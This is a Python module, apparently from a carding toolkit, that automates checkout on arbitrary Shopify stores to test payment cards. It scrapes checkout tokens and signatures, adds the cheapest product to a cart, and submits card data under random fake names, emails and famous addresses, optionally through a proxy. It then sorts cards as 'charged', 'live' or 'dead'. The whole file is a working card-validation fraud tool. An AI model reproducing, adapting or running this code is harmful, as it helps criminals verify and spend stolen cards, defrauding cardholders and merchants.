"""
Shopify Checkout Gateway - GraphQL checkout flow from chk/autoshopify.py.
"""

import re
import json
import random
import string
import uuid
import time
from typing import Dict, Any, Optional
from datetime import datetime
import httpx


class _ClientCtx:
    def __init__(self, proxy=None):
        self._proxy = proxy
    async def __aenter__(self):
        limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
        self._client = httpx.AsyncClient(timeout=45.0, proxy=self._proxy, follow_redirects=True, limits=limits)
        return self._client
    async def __aexit__(self, *args):
        pass

class ShopifyGateway:
    name = "shopify"
    display_name = "Shopify"

    supported_cards = ["visa", "mastercard", "amex", "discover"]
    supported_currencies = ["USD"]

    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    _FIRST = ("John", "Jane", "Michael", "Sarah", "David", "Emily", "James", "Emma")
    _LAST = ("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis")
    _ADDRS = [
        ("1600 Pennsylvania Ave NW", "", "Washington", "DC", "20500"),
        ("350 Fifth Avenue", "", "New York", "NY", "10118"),
        ("233 S Wacker Dr", "", "Chicago", "IL", "60606"),
        ("1 Infinite Loop", "", "Cupertino", "CA", "95014"),
        ("1 Microsoft Way", "", "Redmond", "WA", "98052"),
    ]

    @classmethod
    def _random_string(cls, length=11):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @classmethod
    def _random_name(cls):
        return random.choice(cls._FIRST), random.choice(cls._LAST)

    @classmethod
    def _random_address(cls):
        addr = random.choice(cls._ADDRS)
        phone = f"+1{addr[3]}{random.randint(200,999)}{random.randint(1000,9999)}"
        return {
            "address1": addr[0], "address2": addr[1], "city": addr[2],
            "countryCode": "US", "postalCode": addr[4], "zoneCode": addr[3], "phone": phone,
        }

    @classmethod
    async def _find_cheapest_product(cls, client: httpx.AsyncClient, site: str):
        try:
            resp = await client.get(f"https://{site}/products.json?limit=250", timeout=15)
            if resp.status_code != 200:
                return None, None, None
            products = resp.json().get("products", [])
            cheapest_variant = None
            cheapest_price = float("inf")
            product_handle = None
            for product in products:
                for variant in product.get("variants", []):
                    price = float(variant.get("price", 999999))
                    if 0 < price < cheapest_price:
                        cheapest_price = price
                        cheapest_variant = variant["id"]
                        product_handle = product.get("handle", "")
            return cheapest_variant, cheapest_price, product_handle
        except Exception:
            return None, None, None

    @classmethod
    async def _create_checkout(cls, client: httpx.AsyncClient, site: str, variant_id, product_handle):
        try:
            headers = {"accept": "application/json", "content-type": "application/json", "origin": f"https://{site}", "user-agent": cls.UA}
            resp = await client.post(f"https://{site}/cart/add.js", headers=headers, json={"items": [{"id": int(variant_id), "quantity": 1}]}, timeout=30)
            if resp.status_code != 200:
                return None

            resp = await client.post(f"https://{site}/cart", data={"updates[]": "1", "checkout": ""}, follow_redirects=True, timeout=30)
            if "checkout" not in str(resp.url):
                return None

            checkout_resp = await client.get(str(resp.url), follow_redirects=True, timeout=30)
            checkout_text = checkout_resp.text

            lower = checkout_text.lower()
            if "verifying your connection" in lower or "access denied" in lower:
                return None

            sig = None
            for pattern in [
                r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
                r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
            ]:
                m = re.search(pattern, checkout_text)
                if m:
                    sig = m.group(1).replace("&quot;", "").strip()
                    if sig and len(sig) > 10:
                        break
                    sig = None

            if not sig:
                return None

            m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
            session_token = m.group(1).replace("&quot;", "").strip() if m else ""

            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
            queue_token = m.group(1) if m else ""

            m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
            stable_id = m.group(1) if m else str(uuid.uuid4())

            m = re.search(r'/checkouts/cn/([^/]+)/', str(checkout_resp.url)) or re.search(r'/checkouts/([^/]+)/', str(checkout_resp.url))
            checkout_source_id = m.group(1) if m else ""

            m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
            build_id = m.group(1) if m else "fb347c24d80acb8076f676fa55018bb00cddfde9"

            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
            payment_method_id = m.group(1) if m else ""

            return {
                "site": site, "sig": sig, "session_token": session_token,
                "queue_token": queue_token, "stable_id": stable_id,
                "checkout_source_id": checkout_source_id, "build_id": build_id,
                "payment_method_id": payment_method_id, "checkout_url": str(checkout_resp.url),
            }
        except Exception:
            return None

    @classmethod
    async def _check_card(cls, client: httpx.AsyncClient, checkout_data: Dict, card_number: str, month: int, year: int, cvv: str, variant_id, price):
        first_name, last_name = cls._random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = cls._random_address()

        site = checkout_data["site"]

        pci_resp = await client.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json={
                "credit_card": {"number": card_number, "month": month, "year": year, "verification_value": cvv, "name": cardholder},
                "payment_session_scope": site.replace("www.", ""),
            },
            headers={"accept": "application/json", "content-type": "application/json", "origin": "https://checkout.pci.shopifyinc.com", "shopify-identification-signature": checkout_data["sig"], "user-agent": cls.UA},
            timeout=30,
        )
        if pci_resp.status_code != 200:
            return "error", "PCI_FAILED"

        payment_session_id = pci_resp.json().get("id")
        if not payment_session_id:
            return "error", "NO_SESSION_ID"

        gql_data = {
            "variables": {
                "input": {
                    "sessionInput": {"sessionToken": checkout_data["session_token"]},
                    "queueToken": checkout_data["queue_token"],
                    "delivery": {"deliveryLines": [{"selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}}, "targetMerchandiseLines": {"lines": [{"stableId": checkout_data["stable_id"]}]}, "deliveryMethodTypes": ["NONE"], "expectedTotalPrice": {"any": True}, "destinationChanged": False}], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
                    "merchandise": {"merchandiseLines": [{"stableId": checkout_data["stable_id"], "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": []}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": checkout_data["payment_method_id"], "sessionId": payment_session_id, "billingAddress": {"streetAddress": addr}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr}},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": email},
                    "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}}},
                    "tip": {"tipLines": []}, "note": {"message": None, "customAttributes": []},
                },
                "attemptToken": f"{checkout_data['checkout_source_id']}-{cls._random_string()}",
            },
            "operationName": "SubmitForCompletion",
            "query": "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}",
        }

        resp = await client.post(
            f"https://{site}/checkouts/unstable/graphql",
            params={"operationName": "SubmitForCompletion"},
            headers={"accept": "application/json", "content-type": "application/json", "origin": f"https://{site}", "referer": checkout_data["checkout_url"], "user-agent": cls.UA, "x-checkout-one-session-token": checkout_data["session_token"], "x-checkout-web-build-id": checkout_data["build_id"], "x-checkout-web-source-id": checkout_data["checkout_source_id"]},
            json=gql_data,
            timeout=60,
        )

        if resp.status_code != 200:
            return "error", f"HTTP_{resp.status_code}"

        result = resp.json()
        resp_text = resp.text.lower()

        if "errors" in result:
            err = result["errors"][0].get("message", "ERROR")[:40]
            return "error", err

        completion = result.get("data", {}).get("submitForCompletion", {})
        if not completion:
            if "card_declined" in resp_text:
                return "dead", "CARD_DECLINED"
            if "insufficient" in resp_text:
                return "live", "INSUFFICIENT_FUNDS"
            return "error", "NO_COMPLETION"

        typename = completion.get("__typename", "")

        if typename == "SubmitRejected":
            errors = completion.get("errors", [])
            if errors:
                return "dead", errors[0].get("code", "REJECTED")
            return "dead", "REJECTED"

        if typename == "SubmitFailed":
            return "dead", completion.get("reason", "FAILED")

        receipt = completion.get("receipt", {})
        receipt_type = receipt.get("__typename", "")

        if receipt_type == "ProcessedReceipt" or receipt.get("orderStatusPageUrl"):
            return "charged", "ORDER_PLACED"

        if receipt_type == "FailedReceipt":
            return "dead", receipt.get("processingError", {}).get("code", "FAILED")

        if "card_declined" in resp_text:
            return "dead", "CARD_DECLINED"
        if "insufficient" in resp_text:
            return "live", "INSUFFICIENT_FUNDS"
        if "expired" in resp_text:
            return "dead", "EXPIRED_CARD"

        return "error", typename or "UNKNOWN"

    @classmethod
    async def process(
        cls,
        card_number: str,
        exp_month: int,
        exp_year: int,
        cvv: str,
        amount: float = 1.0,
        currency: str = "USD",
        shopify_site: str = "",
        **kwargs
    ) -> Dict[str, Any]:
        proxy = kwargs.get("proxy")
        t0 = time.time()
        try:
            card_type = cls._detect_card_type(card_number)
            if card_type not in cls.supported_cards:
                return {"status": "error", "success": False, "message": f"Shopify does not support {card_type}", "gateway": cls.name}

            if not shopify_site:
                return {"status": "error", "success": False, "message": "No Shopify site configured", "gateway": cls.name}

            if exp_year > 99:
                exp_year = exp_year % 100

            cc = card_number.replace(" ", "").replace("-", "")
            site = shopify_site.replace("https://", "").replace("http://", "").strip().rstrip("/")

            async with _ClientCtx(proxy) as client:
                variant_id, price, product_handle = await cls._find_cheapest_product(client, site)
                if not variant_id:
                    return {"status": "error", "success": False, "message": "No product found", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                checkout_data = await cls._create_checkout(client, site, variant_id, product_handle)
                if not checkout_data:
                    return {"status": "error", "success": False, "message": "Checkout creation failed", "gateway": cls.name, "time": round(time.time() - t0, 2)}

                status, msg = await cls._check_card(client, checkout_data, cc, exp_month, 2000 + exp_year if exp_year < 100 else exp_year, cvv, variant_id, price)
                elapsed = round(time.time() - t0, 2)

                status_map = {"charged": "charged", "live": "live", "dead": "dead", "ccn": "ccn", "error": "error"}
                final_status = status_map.get(status, "error")

                return {
                    "status": final_status, "success": final_status in ("charged", "live"),
                    "message": msg, "gateway": cls.name,
                    "card_type": card_type, "card_last4": card_number[-4:],
                    "amount": price, "time": elapsed,
                    "timestamp": datetime.now().isoformat(),
                }

        except Exception as e:
            return {"status": "error", "success": False, "message": f"Shopify error: {str(e)}", "gateway": cls.name, "time": round(time.time() - t0, 2), "timestamp": datetime.now().isoformat()}

    @classmethod
    def _detect_card_type(cls, card_number: str) -> str:
        card_number = card_number.replace(" ", "").replace("-", "")
        if card_number.startswith("4"):
            return "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            return "mastercard"
        elif card_number.startswith(("34", "37")):
            return "amex"
        elif card_number.startswith("6011") or card_number.startswith("65"):
            return "discover"
        return "unknown"

    @classmethod
    async def test_connection(cls) -> Dict:
        return {"success": True, "gateway": cls.name, "message": "Shopify gateway ready (requires site URL)", "status": "online"}
